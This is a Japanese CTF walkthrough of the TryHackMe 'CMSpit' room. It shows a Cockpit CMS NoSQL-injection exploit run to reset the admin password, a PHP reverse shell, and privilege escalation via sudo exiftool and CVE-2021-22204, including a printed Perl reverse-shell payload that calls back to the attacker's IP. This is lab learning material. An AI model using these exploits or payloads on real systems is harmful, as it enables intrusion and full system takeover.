# CMSpit CTF

https://tryhackme.com/room/cmspit

## Enumeration

```shell
TARGET=10.201.37.94
sudo bash -c "echo $TARGET   cmspit.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

SSH, HTTP

ブラウザ表示すると、CMS の種類は cockpit, HTMLソースから ver 0.11.1

'Username Enumeration & Password Reset' NoSQL Injection の脆弱性がある。

```sh
$ searchsploit cockpit 0.11.1
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL Injection                                                                                                                            | multiple/webapps/50185.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

認証情報必要ないので早速実行してみる。adminのパスワードを変更。

```sh
$ python ./50185.py -u http://cmspit.thm
[+] http://cmspit.thm: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) : 

[+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']

[-] Get user details For : admin
[+] Finding Password reset tokens
         Tokens Found : ['rp-13079098abfddaece99ddde9137cfb7d6902afd278f03']
[+] Obtaining user information 
-----------------Details--------------------
         [*] user : admin
         [*] name : Admin
         [*] email : admin@yourdomain.de
         [*] active : True
         [*] group : admin
         [*] password : $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
         [*] i18n : en
         [*] _created : 1621655201
         [*] _modified : 1621655201
         [*] _id : 60a87ea165343539ee000300
         [*] _reset_token : rp-13079098abfddaece99ddde9137cfb7d6902afd278f03
         [*] md5email : a11eea8bf873a483db461bb169beccec
--------------------------------------------


[+] Do you want to reset the passowrd for admin? (Y/n): Y
[-] Attempting to reset admin's password:
[+] Password Updated Succesfully!
[+] The New credentials for admin is: 
         Username : admin 
         Password : :m/|NtxOK)
```

ユーザーアカウントを確認すると、その他も全員ADMINグループであることが分かった。

http://cmspit.thm/finder を表示すると、ディレクトリ内のファイルリストが表示された。

/storage/uploads にPHPをアップロードしてリバースシェルを取得成功。

```sh
$ nc -lnvp 8888  
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.37.94] 40912
Linux ubuntu 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 17:33:17 up 23 min,  0 users,  load average: 0.00, 0.34, 1.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格１

```sh
www-data@ubuntu:/$ cd /home/stux

www-data@ubuntu:/home/stux$ ls -al
total 44
drwxr-xr-x 4 stux stux 4096 May 22  2021 .
drwxr-xr-x 3 root root 4096 May 21  2021 ..
-rw-r--r-- 1 root root   74 May 22  2021 .bash_history
-rw-r--r-- 1 stux stux  220 May 21  2021 .bash_logout
-rw-r--r-- 1 stux stux 3771 May 21  2021 .bashrc
drwx------ 2 stux stux 4096 May 21  2021 .cache
-rw-r--r-- 1 root root  429 May 21  2021 .dbshell
-rwxrwxrwx 1 root root    0 May 21  2021 .mongorc.js
drwxrwxr-x 2 stux stux 4096 May 21  2021 .nano
-rw-r--r-- 1 stux stux  655 May 21  2021 .profile
-rw-r--r-- 1 stux stux    0 May 21  2021 .sudo_as_admin_successful
-rw-r--r-- 1 root root  312 May 21  2021 .wget-hsts
-rw------- 1 stux stux   46 May 22  2021 user.txt

www-data@ubuntu:/home/stux$ cat /home/stux/.dbshell
show
show dbs
use admin
use sudousersbak
show dbs
db.user.insert({name: "stux", name: "[REDACTED]"})
show dbs
use sudousersbak
show collections
db
show
db.collectionName.find()
show collections
db.collection_name.find().pretty()
db.user.find().pretty()
db.user.insert({name: "stux"})
db.user.find().pretty()
db.flag.insert({name: "thm{[REDACTED]}"})
show collections
db.flag.find().pretty()
```

su で stux に昇格成功。

## 権限昇格２

exiftool に sudo が付いている。

```sh
stux@ubuntu:~$ sudo -l
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool
```

パスを決め打ちすることでファイルを直接コピーできる。

```sh
11stux@ubuntu:~$ sudo exiftool -filename=./root.txt /root/root.txt
    1 image files updated
stux@ubuntu:~$ cat ./root.txt
thm{[REDACTED]}
```

## CVE-2021-22204 (ExifTool)

未回答の設問が2つあるが、何を問われているのか分からなかった。

```
What is the CVE number for the vulnerability affecting the binary assigned to the system user?
```

```
What is the utility used to create the PoC file?
```

exiftool のバージョンを確認

```sh
stux@ubuntu:~$ exiftool -ver
12.05
```

完全には一致しないがこの脆弱性が表示された。

```sh
$ searchsploit exiftool      
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                                                                                                                                                               | linux/local/50911.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

リバースシェルを仕込んだ画像ファイルを作成できる。

```sh
$ python ./50911.py -s 10.11.146.32 9999
/home/kali/ctf/cmspit/./50911.py:61: SyntaxWarning: invalid escape sequence '\c'
  payload = "(metadata \"\c${"

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(9999,inet_aton('10.11.146.32')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
RUNTIME: DONE - Exploit image written to 'image.jpg'
```

exiftool で ペイロードjpegを読む。

```sh
stux@ubuntu:~$ sudo exiftool ./image.jpg
```

シェル取得成功。

```sh
$ nc -lnvp 9999  
listening on [any] 9999 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.37.94] 59378
# id
uid=0(root) gid=0(root) groups=0(root)
```

2つの設問の答えは、PoCのコードをよく読むと分かった。

## 振り返り

- sudo exiftool は、バージョンが古ければリバースシェルを取れる。バージョンが新しくても、パスが判明している任意のファイルをコピーして読むことはできる。
- シェルから実行するというより、内部的にExifToolを実行してアップロードした画像を読み込むWebアプリケーションに対する攻撃という意味でも覚えておきたい。

## Tags

#tags:exiftool脆弱性
